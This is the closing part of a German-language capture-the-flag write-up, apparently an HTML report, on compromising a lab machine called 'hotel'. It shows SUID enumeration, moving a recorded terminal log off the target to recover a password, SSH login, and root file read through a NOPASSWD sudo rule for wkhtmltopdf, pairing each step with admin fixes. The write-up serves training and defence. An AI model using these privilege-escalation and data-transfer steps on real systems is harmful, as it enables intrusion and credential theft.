+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie den Datenbank-Login als `adminh` mit Passwort `adminp`. Suchen Sie weiter nach Wegen zur Eskalation, z.B. durch Überprüfung von SUID-Dateien oder Suche nach anderen Passwort-Leaks.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Vermeiden Sie Passwort-Wiederverwendung über verschiedene Dienste und Benutzer hinweg.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Suche nach SUID-Dateien als alternativen Eskalationspfad.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@hotel:~/html/hoteldruid/dati$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+   145194    472 -rwsr-xr-x   1 root     root       481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
+   133959     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   152454     20 -rwsr-xr-x   1 root     root          19040 Jan 13  2022 /usr/libexec/polkit-agent-helper-1
+   131687     72 -rwsr-xr-x   1 root     root          71912 Jan 20  2022 /usr/bin/su
+   149116    180 -rwsr-xr-x   1 root     root         182600 Feb 27  2021 /usr/bin/sudo
+   129908     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd
+   133492     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp
+   152452     24 -rwsr-xr-x   1 root     root          23448 Jan 13  2022 /usr/bin/pkexec
+   132048     36 -rwsr-xr-x   1 root     root          35040 Jan 20  2022 /usr/bin/umount
+   129905     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn
+   129909     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd
+   129906     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh
+   131689     56 -rwsr-xr-x   1 root     root          55528 Jan 20  2022 /usr/bin/mount
+                    </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Liste zeigt Standard-SUID-Binaries sowie `pkexec` (bekannt für CVE-2021-4034 / PwnKit) und `sudo`. Da `sudo` zuvor nicht gefunden wurde (PATH-Problem?), ist dessen Existenz nun bestätigt. Es sind keine ungewöhnlichen oder leicht ausnutzbaren SUID-Dateien vorhanden, außer potenziell `pkexec` (abhängig von der genauen Version).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie `sudo -l` (mit vollem Pfad `/usr/bin/sudo -l`, falls nötig) als `www-data`. Prüfen Sie die Version von `pkexec` auf die PwnKit-Schwachstelle. Suchen Sie nach Dateien, die dem Benutzer `person` gehören, um dessen Aktivitäten nachzuvollziehen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie SUID-Berechtigungen. Patchen Sie `pkexec` (PwnKit).
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Suche nach Dateien, die dem Benutzer `person` gehören. Die Ausgabe ist sehr lang und enthält viele Dateien der HotelDruid-Anwendung.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@hotel:/opt$ <span class="command">find / -user person 2>/dev/null</span></div>
+                    <pre>
+/var/www/html/hoteldruid
+/var/www/html/hoteldruid/dati
+/var/www/html/hoteldruid/dati/DATI
+/var/www/html/hoteldruid/inventario.php
+/var/www/html/hoteldruid/base.css
+/var/www/html/hoteldruid/doc
+/var/www/html/hoteldruid/doc/README.themes
+/var/www/html/hoteldruid/doc/README.translation
+...
+                    </pre> <!-- Stark gekürzte Ausgabe -->
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Es scheint, dass der Benutzer `person` für die Installation oder Verwaltung von HotelDruid verantwortlich ist. Es gibt keine offensichtlich verdächtigen Dateien in dieser Liste, die direkt auf ein Passwort oder eine Schwachstelle hindeuten. *Der Bericht springt dann zum Fund der `ttylog`-Datei. Es ist unklar, wie diese gefunden wurde. Möglicherweise durch `find / -name *log* 2>/dev/null` oder eine ähnliche Suche, die hier nicht gezeigt wird.*
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da der nächste Schritt `ttylog` involviert, muss diese Datei durch weitere Enumeration gefunden worden sein. Versuchen Sie Suchen nach Log-Dateien oder Backup-Dateien.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie Dateiberechtigungen und stellen Sie sicher, dass keine sensiblen Log-Dateien für unprivilegierte Benutzer lesbar sind.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Eine Datei namens `ttylog` (vermutlich im Home-Verzeichnis von `www-data` oder `/tmp` gefunden, der Fundort fehlt im Log) wird vom Zielsystem zum Angreifer-System übertragen. Dazu wird auf dem Zielsystem ein Python-HTTP-Server gestartet und auf dem Angreifer-System `wget` verwendet.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@hotel:~/html$ <span class="command">python3 -m http.server</span></div> <!-- Annahme: Befehl im Verzeichnis mit ttylog ausgeführt -->
+                    <pre>
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.2.140 - - [05/Oct/2022 00:00:47] "GET /ttylog HTTP/1.1" 200 -
+                    </pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.116:8000/ttylog</span></div> <!-- IP des Ziels angepasst -->
+                    <pre>
+--2022-10-05 00:00:38--  http://192.168.2.116:8000/ttylog
+Verbindungsaufbau zu 192.168.2.116:8000 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 1592 (1,6K) [application/octet-stream]
+Wird in 'ttylog' gespeichert.
+
+ttylog                                    100%[======================================================================================>]   1,55K  --.-KB/s    in 0s
+
+2022-10-05 00:00:38 (94,5 MB/s) - 'ttylog' gespeichert [1592/1592]
+                    </pre>
+                 </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Log-Datei wurde erfolgreich übertragen. `ttylog`-Dateien stammen oft von Tools wie `ttyrec`, die Terminal-Sitzungen aufzeichnen. Sie können sensible Informationen enthalten.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysieren Sie den Inhalt der `ttylog`-Datei mit Tools wie `strings` oder `ttyplay`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine Terminal-Aufzeichnungen mit sensiblen Daten (wie Passwörtern) ungeschützt auf dem System verbleiben. Löschen Sie alte oder nicht benötigte Logs.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Die heruntergeladene `ttylog`-Datei wird auf dem Angreifer-System mit `strings` untersucht, um lesbare Zeichenketten zu extrahieren. Anschließend wird `ttyplay` (nach Installation via `apt`) verwendet, um die aufgezeichnete Terminal-Sitzung wiederzugeben.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">strings ttylog</span></div>
+                     <pre>
+[?2004h
+]0;person@hotel: ~
+person@hotel:~$
+[?2004l
+[?2004h
+]0;person@hotel: ~
+person@hotel:~$
+[?2004l
+exit
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ttyplay ttylog</span></div>
+                     <pre>
+Command 'ttyplay' not found, but can be installed with:
+apt install ttyrec
+                     </pre> <!-- Hinweis zur Installation -->
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Annahme: ttyrec wurde installiert -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ttyplay ttylog</span></div>
+                     <pre>
+person@hotel:~$ my passw0rd is <span class="password">Endur4nc3.</span> enjoy it!
+                     </pre> <!-- Wiedergabe der aufgezeichneten Sitzung -->
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> **Kritischer Fund!** Die Wiedergabe der Terminal-Sitzung mit `ttyplay` enthüllt das Passwort des Benutzers `person`: `<span class="password">Endur4nc3.</span>`. Es wurde anscheinend versehentlich oder absichtlich in die aufgezeichnete Sitzung eingegeben.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie das gefundene Passwort `<span class="password">Endur4nc3.</span>`, um sich per SSH als Benutzer `person` anzumelden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Schulen Sie Benutzer im sicheren Umgang mit Passwörtern und im Umgang mit Terminal-Aufzeichnungstools. Löschen Sie die `ttylog`-Datei. Ändern Sie das Passwort von `person`.
+            </p>
+        </section>
+
+        <section id="privilege-escalation-prep"> <!-- Abschnitt umbenannt, da SSH-Login zu 'person' führt -->
+             <h2>Lateral Movement / User Access (SSH als person)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Versuch, sich per SSH als Benutzer `person` mit dem aus `ttylog` extrahierten Passwort anzumelden.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh person@192.168.2.116</span></div> <!-- IP angepasst -->
+                     <pre>
+The authenticity of host '192.168.2.116 (192.168.2.116)' can't be established.
+ED25519 key fingerprint is SHA256:sYCJAYzE541/4ZyAtfmrZZRGQ7hdWYx8yZEu01QeB8.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added '192.168.2.116' (ED25519) to the list of known hosts.
+person@192.168.2.116's password: <span class="password">Endur4nc3.</span>
+Linux hotel 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Feb 20 14:40:49 2022 from 192.168.1.51
+person@hotel:~$
+                     </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> **SSH-Login als `person` erfolgreich!** Der Pentester hat nun eine interaktive Shell als Benutzer `person`.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lesen Sie die User-Flag. Führen Sie `sudo -l` aus, um die Sudo-Berechtigungen für `person` zu prüfen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Ändern Sie das Passwort von `person`. Löschen Sie die `ttylog`-Datei.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die User-Flag wird im Home-Verzeichnis von `person` gelesen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">person@hotel:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">RUvSNcQ3m2yHzxHMV</span></pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die User-Flag wurde erfolgreich gelesen.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Flag. Führen Sie `sudo -l` aus.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine spezifischen Maßnahmen für die Flag.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die `sudo`-Berechtigungen für den Benutzer `person` werden mit `sudo -l` überprüft.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">person@hotel:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for person on hotel:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User person may run the following commands on hotel:
+    (root) NOPASSWD: /usr/bin/wkhtmltopdf
+                     </pre>
+                 </div>
+             </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Kritischer Fund für Privilege Escalation!** Der Benutzer `person` darf `/usr/bin/wkhtmltopdf` als `root` **ohne Passwort** (`NOPASSWD`) ausführen. `wkhtmltopdf` ist ein Tool zum Konvertieren von HTML zu PDF und kann oft missbraucht werden, um lokale Dateien zu lesen (Local File Read), auf die der ausführende Benutzer normalerweise keinen Zugriff hat, indem eine HTML-Datei mit einem `file://`-Link erstellt wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie die `sudo wkhtmltopdf`-Berechtigung, um die Root-Flag (`/root/root.txt`) zu lesen. Erstellen Sie dazu eine einfache HTML-Datei, die `/root/root.txt` einbindet (z.B. mit `iframe src="file:///root/root.txt"`) und konvertieren Sie diese HTML-Datei dann mit `sudo wkhtmltopdf [html_datei] output.pdf` in eine PDF. Übertragen Sie die PDF-Datei auf das Angreifer-System und extrahieren Sie die Flag.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Entfernen Sie die unsichere `sudoers`-Regel für `wkhtmltopdf`. Gewähren Sie `sudo`-Rechte nur für absolut notwendige und sichere Befehle/Skripte. Vermeiden Sie `NOPASSWD`.
+            </p>
+        </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept (Privilege Escalation via Sudo wkhtmltopdf)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Exploit-Pfad über `wkhtmltopdf` wird vorbereitet und ausgeführt.
+                1.  (Impliziert) Eine einfache HTML-Datei (z.B. `flag.html`) wird erstellt, die `/root/root.txt` mittels `file://` einbindet. Beispielinhalt: `<iframe src="file:///root/root.txt" width="800" height="600"></iframe>`
+                2.  Der Befehl `sudo wkhtmltopdf /root/root.txt root.pdf` wird ausgeführt. Dies ist eine **vereinfachte Methode**, die direkt versucht, die Textdatei in eine PDF umzuwandeln, was oft funktioniert, um den reinen Textinhalt zu extrahieren, ohne eine separate HTML-Datei zu benötigen. Da der Befehl mit `sudo` als `root` läuft, kann `/root/root.txt` gelesen werden.
+            </p>
+            <!-- Schritte zum Übertragen der User-PDF sind zur Veranschaulichung, aber nicht Teil des PrivEsc -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">person@hotel:~$ <span class="command">wkhtmltopdf user.txt user.pdf</span></div>
+                     <pre>
+Loading page (1/2)
+Printing pages (2/2)
+Done
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">person@hotel:~$ <span class="command">python3 -m http.server 8888</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+192.168.2.140 - - [05/Oct/2022 00:15:03] "GET /user.pdf HTTP/1.1" 200 -
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.116:8888/user.pdf</span></div> <!-- IP angepasst -->
+                     <pre>
+--2022-10-05 00:14:53--  http://192.168.2.116:8888/user.pdf
+Verbindungsaufbau zu 192.168.2.116:8888 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 7795 (7,6K) [application/pdf]
+Wird in 'user.pdf' gespeichert.
+
+user.pdf                                100%[======================================================================================>]   7,61K  --.-KB/s    in 0s
+
+2022-10-05 00:14:53 (XX MB/s) - 'user.pdf' gespeichert [7795/7795]
+                     </pre>
+                 </div>
+             </div>
+             <!-- Eigentlicher PrivEsc -->
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">person@hotel:~$ <span class="command">sudo wkhtmltopdf /root/root.txt root.pdf</span></div>
+                     <pre>
+QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
+Loading page (1/2)
+Printing pages (2/2)
+Done
+                     </pre>
+                 </div>
+             </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Privilege Escalation erfolgreich!** Die unsichere `sudo`-Regel für `wkhtmltopdf` wurde genutzt, um den Inhalt der `/root/root.txt`-Datei in eine PDF-Datei (`root.pdf`) zu schreiben. Diese PDF-Datei gehört nun dem Benutzer `person` und kann von ihm gelesen oder übertragen werden.
+            </p>
+            <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Übertragen Sie die `root.pdf`-Datei auf Ihr Angreifer-System (z.B. mit `python3 -m http.server` auf dem Ziel und `wget` auf dem Angreifer) und extrahieren Sie die Root-Flag daraus (z.B. durch Öffnen der PDF oder mit `pdftotext`).
+                 <br>
+                 <strong>Empfehlung (Admin):** **Dringend:** Entfernen Sie die `sudo`-Regel für `wkhtmltopdf`. Überprüfen Sie alle `sudo`-Regeln auf ähnliche Schwachstellen (GTFOBins ist eine gute Ressource hierfür).
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> (Impliziert) Die Datei `root.pdf` wurde auf das Angreifer-System übertragen (ähnlich wie zuvor `user.pdf`). Der Inhalt der PDF wird extrahiert oder angezeigt, um die Root-Flag zu enthüllen.
+            </p>
+            <div class="code-block">
+                 <!-- Kein Terminal-Prompt, beschreibt Aktion auf Angreifer-System -->
+                 <pre>
+--- Öffnen von root.pdf auf Angreifer-System ---
+<span class="password">7MUnADgp3g4STEPHMV</span>
+                 </pre>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Root-Flag wurde erfolgreich aus der erstellten PDF-Datei extrahiert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Flags und schließen Sie den Bericht ab.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Fokus auf die Behebung der Kernursachen: RCE in HotelDruid, Klartext-DB-Credentials in PHP, unsichere Log-Speicherung (`ttylog`), unsichere `sudo`-Regel.
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                     <div class="flag-command">cat /home/person/user.txt</div>
+                     <div class="flag-value"><span class="password">RUvSNcQ3m2yHzxHMV</span></div>
+                </div>
+
+                <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">7MUnADgp3g4STEPHMV</span></div>
+                </div>
+            </div>
+             <!-- Separate Analyse für Flags nicht nötig, da im POC-Abschnitt behandelt -->
+        </section>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2022-10-04</p> <!-- Datum aus Nikto -->
+    </footer>
+</body>
+</html>
